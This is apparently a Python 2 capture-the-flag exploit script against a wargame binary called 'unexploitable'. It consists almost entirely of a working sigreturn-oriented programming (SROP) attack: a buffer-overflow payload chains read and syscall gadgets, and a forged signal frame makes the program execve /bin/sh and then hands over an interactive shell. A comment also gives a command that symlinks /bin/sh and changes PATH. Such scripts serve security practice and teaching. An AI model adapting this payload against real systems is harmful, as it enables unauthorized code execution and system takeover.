#!/usr/bin/env python2.7 # -*- coding:utf-8 -*-
from mkpwn import *
from time import sleep

# settings
local   = True
debug   = True

if local:
    target  = '/home/unexploitable/unexploitable'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)

# global
SYSCALL             = 0x00400560
DATA                = 0x00601000
PLT_READ            = 0x00400430
STAGE               = DATA + 0x500
MAIN                = 0x400362              # "main"

junk                = 0x18
execve_syscall_id   = 0x3b
sigret_syscall_id   = 0xf

def sigret_frame(arg1, arg2, arg3, rax, rip, rsp):
    frame    = 'A' * 8 * 5 
    frame   += l64(0x0)         # r8
    frame   += l64(0x0)         # r9
    frame   += l64(0x0)         # r10
    frame   += l64(0x0)         # r11
    frame   += l64(0x0)         # r12
    frame   += l64(0x0)         # r13
    frame   += l64(0x0)         # r14
    frame   += l64(0x0)         # r15
    frame   += l64(arg1)        # rdi
    frame   += l64(arg2)        # rsi
    frame   += l64(0x0)         # rbp
    frame   += l64(0x0)         # rbx
    frame   += l64(arg3)        # rdx
    frame   += l64(rax)         # rax
    frame   += l64(0x0)         # rcx
    frame   += l64(rsp)         # rsp
    frame   += l64(rip)         # rip
    frame   += l64(0x0)         # eflag
    frame   += l64(0x2b0033)    # csgsfs
    frame   += l64(0) * 6
    return frame

# ln -s /bin/sh main; export PATH=$PATH:"/tmp/Icemakrrr"

# exp
def exp():
    # io.hint([0x0000000000400577])
    payload  = 'A' * junk 
    payload += l64(PLT_READ)
    payload += l64(SYSCALL)
    payload += sigret_frame(MAIN, 0x0, 0x0, execve_syscall_id, SYSCALL, STAGE)

    sleep(3)

    io.pr(payload)
    sleep(3)
    io.pr('\x00' * (sigret_syscall_id - 1))

    io.interact()

# main
if __name__ == '__main__':
    exp()
